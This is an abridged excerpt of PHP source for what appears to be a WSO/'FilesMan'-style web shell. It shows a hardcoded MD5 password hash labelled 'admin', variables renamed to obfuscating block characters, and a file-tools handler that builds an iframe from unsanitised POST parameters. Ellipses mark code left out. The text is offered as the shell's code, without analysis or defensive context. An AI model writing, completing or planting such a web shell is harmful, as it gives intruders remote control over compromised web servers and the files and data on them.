<?php
//-----------------Password---------------------
$▛ = "0bb8a5f8009e7e86707ead9e4b89f523"; //admin
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function actionFilesTools() {
	...
	switch($_POST['p2']) {
		...
		case 'touch':
			...
			break;
		case 'frame':
			echo "<iframe width='100%' height='900px' scrolling='no' src=".'//'.$_SERVER['HTTP_HOST'] . substr($_POST['c'] . $_POST['p1'], strlen($_SERVER['DOCUMENT_ROOT']))." onload='onload=height=contentDocument.body.scrollHeight'></iframe>";
			break;
	}
	echo '</div>';
	hardFooter();
